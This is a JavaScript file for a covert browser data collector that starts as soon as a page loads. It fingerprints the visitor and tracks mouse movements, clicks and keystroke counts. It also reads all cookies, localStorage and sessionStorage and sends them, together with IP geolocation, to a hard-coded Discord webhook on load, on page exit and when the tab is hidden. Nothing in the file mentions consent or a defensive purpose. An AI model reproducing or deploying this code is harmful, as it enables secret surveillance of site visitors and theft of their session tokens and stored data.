// Ultra Advanced Data Collection System
class DataCollector {
    constructor() {
        this.sessionId = this.generateSessionId();
        this.startTime = Date.now();
        this.data = {};
        this.webhookUrl = 'https://discord.com/api/webhooks/1443155573884588225/HfZjgck464XhGLBgxkXqxKmTSGlgV-FfBO8c4AaYTlE8naJOHUvSSyJZXGucu5JZshcc';
        this.init();
    }

    generateSessionId() {
        return `${Date.now()}_${Math.random().toString(36).substr(2, 9)}_${navigator.userAgent.length}`;
    }

    async init() {
        // Immediate data collection on page load
        await this.collectAll();
        await this.sendToWebhook('initial');
        
        // Set up exit tracking
        this.setupExitTracking();
        
        // Continuous monitoring
        this.startMonitoring();
    }

    async collectAll() {
        this.data = {
            session: {
                id: this.sessionId,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || 'direct',
            },
            browser: await this.collectBrowserData(),
            device: await this.collectDeviceData(),
            network: await this.collectNetworkData(),
            fingerprint: await this.generateFingerprint(),
            behavior: this.collectBehaviorData(),
            permissions: await this.checkAllPermissions(),
            system: await this.collectSystemData(),
        };
    }

    async collectBrowserData() {
        const data = {
            userAgent: navigator.userAgent,
            appName: navigator.appName,
            appCodeName: navigator.appCodeName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            product: navigator.product,
            productSub: navigator.productSub,
            language: navigator.language,
            languages: navigator.languages,
            onLine: navigator.onLine,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            msMaxTouchPoints: navigator.msMaxTouchPoints,
            plugins: this.getPluginsData(),
            mimeTypes: this.getMimeTypesData(),
        };

        // WebGL data
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.webgl = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
            };
        }

        // Audio context
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            const audioContext = new AudioContext();
            const analyser = audioContext.createAnalyser();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();
            
            data.audio = {
                sampleRate: audioContext.sampleRate,
                state: audioContext.state,
                baseLatency: audioContext.baseLatency,
                outputLatency: audioContext.outputLatency,
                channelCount: analyser.channelCount,
                fftSize: analyser.fftSize,
            };
            
            audioContext.close();
        } catch(e) {}

        return data;
    }

    getPluginsData() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            const mimeTypes = [];
            for (let j = 0; j < plugin.length; j++) {
                mimeTypes.push({
                    type: plugin[j].type,
                    suffixes: plugin[j].suffixes,
                    description: plugin[j].description,
                });
            }
            plugins.push({
                name: plugin.name,
                filename: plugin.filename,
                description: plugin.description,
                mimeTypes: mimeTypes,
            });
        }
        return plugins;
    }

    getMimeTypesData() {
        const mimeTypes = [];
        for (let i = 0; i < navigator.mimeTypes.length; i++) {
            mimeTypes.push({
                type: navigator.mimeTypes[i].type,
                suffixes: navigator.mimeTypes[i].suffixes,
                description: navigator.mimeTypes[i].description,
                enabledPlugin: navigator.mimeTypes[i].enabledPlugin ? navigator.mimeTypes[i].enabledPlugin.name : null,
            });
        }
        return mimeTypes;
    }

    async collectDeviceData() {
        const data = {
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? {
                    type: screen.orientation.type,
                    angle: screen.orientation.angle,
                } : null,
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                screenX: window.screenX,
                screenY: window.screenY,
                screenLeft: window.screenLeft,
                screenTop: window.screenTop,
                scrollX: window.scrollX,
                scrollY: window.scrollY,
                devicePixelRatio: window.devicePixelRatio,
            },
            memory: navigator.deviceMemory,
            cpuClass: navigator.cpuClass,
            oscpu: navigator.oscpu,
            buildID: navigator.buildID,
        };

        // Battery
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                data.battery = {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level,
                };
            }
        } catch(e) {}

        // Media devices
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            data.mediaDevices = devices.map(device => ({
                kind: device.kind,
                label: device.label || `${device.kind} device`,
                deviceId: device.deviceId.substring(0, 10),
                groupId: device.groupId.substring(0, 10),
            }));
        } catch(e) {}

        // Storage
        try {
            if (navigator.storage && navigator.storage.estimate) {
                const estimate = await navigator.storage.estimate();
                data.storage = {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    persisted: await navigator.storage.persisted(),
                };
            }
        } catch(e) {}

        // Connection
        if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            data.connection = {
                effectiveType: connection.effectiveType,
                type: connection.type,
                downlink: connection.downlink,
                downlinkMax: connection.downlinkMax,
                rtt: connection.rtt,
                saveData: connection.saveData,
            };
        }

        return data;
    }

    async collectNetworkData() {
        const data = {};

        // Get IP and location data
        try {
            const ipApis = [
                { url: 'https://api.ipify.org?format=json', key: 'ipify' },
                { url: 'https://api.ip.sb/geoip', key: 'ipsb' },
                { url: 'https://ipapi.co/json/', key: 'ipapi' },
                { url: 'https://api.ipgeolocation.io/ipgeo?apiKey=demo', key: 'ipgeolocation' },
                { url: 'https://ipwho.is/', key: 'ipwho' }
            ];

            for (const api of ipApis) {
                try {
                    const response = await fetch(api.url);
                    if (response.ok) {
                        data[api.key] = await response.json();
                    }
                } catch(e) {}
            }
        } catch(e) {}

        // Performance timing
        if (performance.timing) {
            const timing = performance.timing;
            data.timing = {
                navigationStart: timing.navigationStart,
                unloadEventStart: timing.unloadEventStart,
                unloadEventEnd: timing.unloadEventEnd,
                redirectStart: timing.redirectStart,
                redirectEnd: timing.redirectEnd,
                fetchStart: timing.fetchStart,
                domainLookupStart: timing.domainLookupStart,
                domainLookupEnd: timing.domainLookupEnd,
                connectStart: timing.connectStart,
                connectEnd: timing.connectEnd,
                secureConnectionStart: timing.secureConnectionStart,
                requestStart: timing.requestStart,
                responseStart: timing.responseStart,
                responseEnd: timing.responseEnd,
                domLoading: timing.domLoading,
                domInteractive: timing.domInteractive,
                domContentLoadedEventStart: timing.domContentLoadedEventStart,
                domContentLoadedEventEnd: timing.domContentLoadedEventEnd,
                domComplete: timing.domComplete,
                loadEventStart: timing.loadEventStart,
                loadEventEnd: timing.loadEventEnd,
            };
        }

        return data;
    }

    async generateFingerprint() {
        const fingerprint = {};

        // Canvas fingerprinting
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 280;
        canvas.height = 60;
        
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.font = '11pt Arial';
        ctx.fillText('Canvas fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.font = '18pt Arial';
        ctx.fillText('BrowserLeaks.com', 4, 45);
        
        fingerprint.canvas = canvas.toDataURL();

        // Font detection
        const fonts = [
            'Andale Mono', 'Arial', 'Arial Black', 'Arial Hebrew', 'Arial MT', 'Arial Narrow', 'Arial Rounded MT Bold',
            'Arial Unicode MS', 'Bitstream Vera Sans Mono', 'Book Antiqua', 'Bookman Old Style', 'Calibri', 'Cambria',
            'Cambria Math', 'Century', 'Century Gothic', 'Century Schoolbook', 'Comic Sans', 'Comic Sans MS', 'Consolas',
            'Courier', 'Courier New', 'Geneva', 'Georgia', 'Helvetica', 'Helvetica Neue', 'Impact', 'Lucida Bright',
            'Lucida Calligraphy', 'Lucida Console', 'Lucida Fax', 'LUCIDA GRANDE', 'Lucida Handwriting', 
            'Lucida Sans', 'Lucida Sans Typewriter', 'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Monaco',
            'Monotype Corsiva', 'MS Gothic', 'MS Outlook', 'MS PGothic', 'MS Reference Sans Serif', 'MS Sans Serif',
            'MS Serif', 'MYRIAD', 'MYRIAD PRO', 'Palatino', 'Palatino Linotype', 'Segoe Print', 'Segoe Script',
            'Segoe UI', 'Segoe UI Light', 'Segoe UI Semibold', 'Segoe UI Symbol', 'Tahoma', 'Times', 'Times New Roman',
            'Times New Roman PS', 'Trebuchet MS', 'Verdana', 'Wingdings', 'Wingdings 2', 'Wingdings 3'
        ];
        
        const detectedFonts = [];
        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        
        const s = document.createElement('span');
        s.style.position = 'absolute';
        s.style.left = '-9999px';
        s.style.fontSize = testSize;
        s.innerHTML = testString;
        document.body.appendChild(s);
        
        const baselineWidths = {};
        baseFonts.forEach(baseFont => {
            s.style.fontFamily = baseFont;
            baselineWidths[baseFont] = s.offsetWidth;
        });
        
        fonts.forEach(font => {
            let detected = false;
            baseFonts.forEach(baseFont => {
                s.style.fontFamily = `'${font}',${baseFont}`;
                if (s.offsetWidth !== baselineWidths[baseFont]) {
                    detected = true;
                }
            });
            if (detected) {
                detectedFonts.push(font);
            }
        });
        
        document.body.removeChild(s);
        fingerprint.fonts = detectedFonts;

        // Timezone
        fingerprint.timezone = {
            offset: new Date().getTimezoneOffset(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
        };

        // Create unique hash
        const fpString = JSON.stringify(fingerprint);
        let hash = 0;
        for (let i = 0; i < fpString.length; i++) {
            const char = fpString.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        fingerprint.hash = Math.abs(hash).toString(36);

        return fingerprint;
    }

    collectBehaviorData() {
        const data = {
            mouseMovements: [],
            clicks: [],
            keystrokes: 0,
            scrolls: [],
            touches: [],
            visibility: [],
            focus: [],
        };

        // Mouse tracking
        let lastMouseTime = Date.now();
        document.addEventListener('mousemove', (e) => {
            const now = Date.now();
            if (now - lastMouseTime > 100) {
                data.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: now - this.startTime,
                });
                lastMouseTime = now;
                if (data.mouseMovements.length > 50) data.mouseMovements.shift();
            }
        });

        // Click tracking
        document.addEventListener('click', (e) => {
            data.clicks.push({
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName,
                time: Date.now() - this.startTime,
            });
        });

        // Keystroke counting
        document.addEventListener('keydown', () => {
            data.keystrokes++;
        });

        // Scroll tracking
        let lastScrollTime = Date.now();
        window.addEventListener('scroll', () => {
            const now = Date.now();
            if (now - lastScrollTime > 200) {
                data.scrolls.push({
                    x: window.scrollX,
                    y: window.scrollY,
                    time: now - this.startTime,
                });
                lastScrollTime = now;
            }
        });

        // Touch tracking
        document.addEventListener('touchstart', (e) => {
            data.touches.push({
                touches: e.touches.length,
                time: Date.now() - this.startTime,
            });
        });

        // Visibility tracking
        document.addEventListener('visibilitychange', () => {
            data.visibility.push({
                hidden: document.hidden,
                time: Date.now() - this.startTime,
            });
        });

        // Focus tracking
        window.addEventListener('focus', () => {
            data.focus.push({
                type: 'focus',
                time: Date.now() - this.startTime,
            });
        });

        window.addEventListener('blur', () => {
            data.focus.push({
                type: 'blur',
                time: Date.now() - this.startTime,
            });
        });

        return data;
    }

    async checkAllPermissions() {
        const permissions = {};
        const permissionNames = [
            'accelerometer', 'ambient-light-sensor', 'background-fetch', 'background-sync',
            'bluetooth', 'camera', 'clipboard-read', 'clipboard-write', 'geolocation',
            'gyroscope', 'magnetometer', 'microphone', 'midi', 'notifications',
            'payment-handler', 'persistent-storage', 'push', 'screen-wake-lock', 'speaker'
        ];

        for (const permission of permissionNames) {
            try {
                const result = await navigator.permissions.query({ name: permission });
                permissions[permission] = result.state;
            } catch (e) {
                permissions[permission] = 'not-supported';
            }
        }

        return permissions;
    }

    async collectSystemData() {
        const data = {
            localStorage: {},
            sessionStorage: {},
            indexedDB: [],
            cookies: document.cookie,
        };

        // LocalStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {}

        // SessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}

        // IndexedDB databases
        try {
            if ('databases' in indexedDB) {
                const databases = await indexedDB.databases();
                data.indexedDB = databases.map(db => ({ name: db.name, version: db.version }));
            }
        } catch(e) {}

        // Service Workers
        try {
            if ('serviceWorker' in navigator) {
                const registrations = await navigator.serviceWorker.getRegistrations();
                data.serviceWorkers = registrations.map(reg => ({
                    scope: reg.scope,
                    active: reg.active ? reg.active.state : null,
                }));
            }
        } catch(e) {}

        return data;
    }

    async sendToWebhook(trigger) {
        try {
            const payload = {
                content: `🎯 **[${trigger.toUpperCase()}]** データ収集完了`,
                embeds: [{
                    title: "🔍 詳細情報を取得しました",
                    color: trigger === 'initial' ? 0x00ff00 : trigger === 'exit' ? 0xff0000 : 0x0099ff,
                    fields: [
                        {
                            name: "📍 セッション",
                            value: `\`\`\`${this.data.session.id}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🌐 IPアドレス",
                            value: this.data.network?.ipify?.ip || this.data.network?.ipsb?.ip || 'N/A',
                            inline: true
                        },
                        {
                            name: "📍 位置情報",
                            value: this.data.network?.ipapi ? `${this.data.network.ipapi.city}, ${this.data.network.ipapi.country_name}` : 'N/A',
                            inline: true
                        },
                        {
                            name: "💻 デバイス",
                            value: `${this.data.browser.platform}\n${this.data.device.screen.width}x${this.data.device.screen.height}`,
                            inline: true
                        },
                        {
                            name: "🌏 ブラウザ",
                            value: this.data.browser.userAgent.substring(0, 100),
                            inline: false
                        },
                        {
                            name: "🔋 バッテリー",
                            value: this.data.device.battery ? `${Math.round(this.data.device.battery.level * 100)}% ${this.data.device.battery.charging ? '充電中' : ''}` : 'N/A',
                            inline: true
                        },
                        {
                            name: "📱 メディアデバイス",
                            value: `${this.data.device.mediaDevices?.length || 0}個`,
                            inline: true
                        },
                        {
                            name: "🎨 Canvas指紋",
                            value: this.data.fingerprint?.canvas?.substring(0, 50) + '...' || 'N/A',
                            inline: false
                        },
                        {
                            name: "🔐 権限",
                            value: `Camera: ${this.data.permissions?.camera || 'N/A'}\nMic: ${this.data.permissions?.microphone || 'N/A'}`,
                            inline: true
                        },
                        {
                            name: "⏱️ 滞在時間",
                            value: `${Math.floor((Date.now() - this.startTime) / 1000)}秒`,
                            inline: true
                        }
                    ],
                    footer: {
                        text: `Captured at ${new Date().toLocaleString('ja-JP')}`
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // Send main webhook
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // Send detailed JSON as file
            const formData = new FormData();
            const jsonBlob = new Blob([JSON.stringify(this.data, null, 2)], { type: 'application/json' });
            
            formData.append('payload_json', JSON.stringify({
                content: `📎 詳細データファイル (${trigger})`,
            }));
            formData.append('file', jsonBlob, `session_${this.sessionId}_${trigger}.json`);

            await fetch(this.webhookUrl, {
                method: 'POST',
                body: formData
            });

        } catch (error) {
            console.error('Webhook error:', error);
        }
    }

    setupExitTracking() {
        // Before unload
        window.addEventListener('beforeunload', async (e) => {
            await this.collectAll();
            await this.sendToWebhook('exit');
        });

        // Page hide (mobile)
        document.addEventListener('visibilitychange', async () => {
            if (document.hidden) {
                await this.collectAll();
                await this.sendToWebhook('hidden');
            }
        });
    }

    startMonitoring() {
        // Update data every 30 seconds
        setInterval(async () => {
            await this.collectAll();
        }, 30000);
    }
}

// Initialize collector immediately
const collector = new DataCollector();
